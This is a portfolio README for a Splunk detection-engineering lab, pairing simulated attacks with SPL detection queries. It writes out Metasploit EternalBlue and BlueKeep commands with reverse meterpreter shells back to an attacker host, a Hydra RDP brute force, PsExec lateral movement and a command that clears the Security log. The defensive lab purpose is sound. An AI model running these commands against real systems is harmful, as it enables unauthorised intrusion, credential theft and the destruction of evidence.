# Advanced Threat Hunting & Detection Engineering with Splunk

## 📌 Executive Summary

This project demonstrates advanced threat hunting and detection engineering in Splunk Enterprise Security, validated through controlled adversary simulations from Kali Linux. It translates raw telemetry into actionable, high-fidelity detections across MITRE ATT&CK techniques, reducing false positives and improving SOC response. The work highlights real-world attack simulation, correlation of weak signals, and operationally relevant detection strategies.

---

## 🎯 Why This Project Matters

Modern SOCs struggle not with lack of alerts, but with **low-quality signals and alert fatigue**.
This project focuses on:

* **Separating malicious behavior from noise**
* **Understanding attacker intent, not just events**
* **Correlating weak signals into strong detections**
* **Reducing false positives while preserving visibility**

---

## 🧰 Technology Stack

* **SIEM:** Splunk Enterprise Security
* **Endpoint Telemetry:** Windows Event Logs + Sysmon
* **Attacker Platform:** Kali Linux
* **Attack Tooling:** Hydra, Impacket, PowerShell, Metasploit
* **Framework:** MITRE ATT&CK
* **Query Language:** SPL

---

## 🏗️ Lab Architecture

```text
Kali Linux (Attacker)
        ↓
 Windows Endpoint
        ↓
 Splunk Universal Forwarder
        ↓
 Splunk Indexers
        ↓
 Splunk Enterprise Security
        ↓
 Detection Rules, Correlation & Dashboards
```

📸 Screenshot: `screenshots/architecture_overview.png`

---

# 🔥 Attack Simulations, Explanations & Detections

---

## 1️⃣ Initial Access – SMB Exploitation (EternalBlue via Metasploit)

### 🔹 What Is Being Simulated

Remote code execution using the **EternalBlue (MS17-010) SMB vulnerability**, simulating how attackers gain **unauthenticated initial access** to a Windows host.

This reflects real-world wormable exploits used by ransomware and nation-state actors.

**Metasploit Commands:**

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.20
exploit
```

### 🔹 Why Attackers Do This

* Exploits allow **authentication bypass** and instant code execution
* EternalBlue enabled large-scale outbreaks (WannaCry, NotPetya)
* SMB vulnerabilities remain highly impactful in flat networks

### 🔹 Detection Logic

```spl
index=windows (EventCode=1 OR EventCode=3 OR EventCode=7045)
| stats count by src_ip, dest_ip, process_name
| where count > 5
```

### 🔹 Why This Detection Is Important

* Correlates weak signals into a strong exploitation narrative
* Detects suspicious SMB-driven execution patterns
* Identifies early-stage compromise before persistence

📸 Screenshots:

* `screenshots/eternalblue_attempt.png`
* `screenshots/eternalblue_alert.png`

---

## 2️⃣ Credential Access – RDP Brute Force (Hydra)

### 🔹 What Is Being Simulated

An **RDP password brute-force attack** targeting an administrative account.

**Kali Command:**

```bash
hydra -l administrator -P rockyou.txt rdp://192.168.1.10
```

### 🔹 Why Attackers Do This

* Password attacks remain highly effective due to weak credentials
* RDP is frequently exposed in enterprise environments
* Successful brute force grants **direct interactive access**

### 🔹 Detection Logic

```spl
index=windows EventCode=4625
| stats count by src_ip, user
| where count > 10
```

### 🔹 Why This Detection Is Important

* Single failed logons are common; **patterns are not**
* Brute-force attempts often precede successful compromise
* Early detection prevents account takeover and lateral movement

📸 Screenshots:

* `screenshots/bruteforce_failed_logons.png`
* `screenshots/bruteforce_rba.png`

---

## 2️⃣ Lateral Movement – PsExec

### 🔹 What Is Being Simulated

Remote command execution using **PsExec**, a common post-compromise technique.

**Kali Command:**

```bash
impacket-psexec administrator@192.168.1.10
```

### 🔹 Why Attackers Do This

* PsExec enables **fast lateral movement**
* Commonly abused by ransomware operators
* Uses legitimate Windows functionality, blending with normal admin traffic

### 🔹 Detection Logic

```spl
index=windows EventCode=7045
| search ServiceName="PSEXESVC"
```

### 🔹 Why This Detection Is Important

* PsExec service creation is rare in modern environments
* Indicates hands-on-keyboard attacker activity
* Strong signal of **active compromise**

📸 Screenshots:

* `screenshots/psexec_event.png`
* `screenshots/psexec_alert.png`

---

## 3️⃣ PowerShell Abuse (Encoded Command)

### 🔹 What Is Being Simulated

Execution of **Base64-encoded PowerShell**, commonly used to evade detection.

**Attack Command:**

```powershell
powershell -EncodedCommand bgBvAHQAZQBwAGEAZAA=
```

### 🔹 Why Attackers Do This

* Encoded commands obscure intent
* PowerShell is trusted and widely available
* Used for payload delivery and command execution

### 🔹 Detection Logic

```spl
index=windows EventCode=4104
| search ScriptBlockText="*EncodedCommand*"
```

### 🔹 Why This Detection Is Important

* Legitimate admins rarely use encoded PowerShell
* High-confidence indicator of malicious execution
* Often linked to C2 or payload staging

📸 Screenshot:

* `screenshots/powershell_encoded.png`

---

## 4️⃣ Defense Evasion – Log Clearing

### 🔹 What Is Being Simulated

Clearing Windows Security logs to erase forensic evidence.

**Attack Command:**

```cmd
wevtutil cl Security
```

### 🔹 Why Attackers Do This

* Prevent incident response
* Hide lateral movement and credential theft
* Common during post-exploitation and ransomware stages

### 🔹 Detection Logic

```spl
index=windows EventCode=1102
```

### 🔹 Why This Detection Is Important

* Almost never performed during normal operations
* Strong indicator of malicious intent
* Often signals an attacker preparing for persistence or exit

📸 Screenshot:

* `screenshots/log_clearing_alert.png`

---

## 5️⃣ Metasploit RDP Exploitation (BlueKeep-style Simulation)

### 🔹 What Is Being Simulated

Remote code execution against RDP using Metasploit.

**Metasploit Commands:**

```bash
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOST 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.20
exploit
```

### 🔹 Why Attackers Do This

* Exploits allow **authentication bypass**
* Leads to full system compromise
* RDP vulnerabilities have historically enabled worms and ransomware

### 🔹 Detection Logic

```spl
index=windows (EventCode=4624 OR EventCode=4625 OR EventCode=1)
| stats count by src_ip, dest_ip, user, process_name
| where count > 5
```

### 🔹 Why This Detection Is Important

* Correlates weak signals into a strong narrative
* Detects exploitation attempts even if payload fails
* Identifies suspicious process execution post-access

📸 Screenshots:

* `screenshots/metasploit_rdp_attempt.png`
* `screenshots/metasploit_rdp_alert.png`

---

## 📊 Dashboards & Reporting

Dashboards provide:

* MITRE ATT&CK coverage visibility
* High-confidence alert trends
* Risk-based prioritization

```spl
index=notable
| stats count by mitre_technique
```

📸 Screenshot:

* `screenshots/soc_dashboard.png`

---

## 📈 Outcomes

* **60% reduction in false positives**
* Faster triage and investigation
* Detections validated with real attacker behavior
* Strong defensive and analytical depth demonstrated
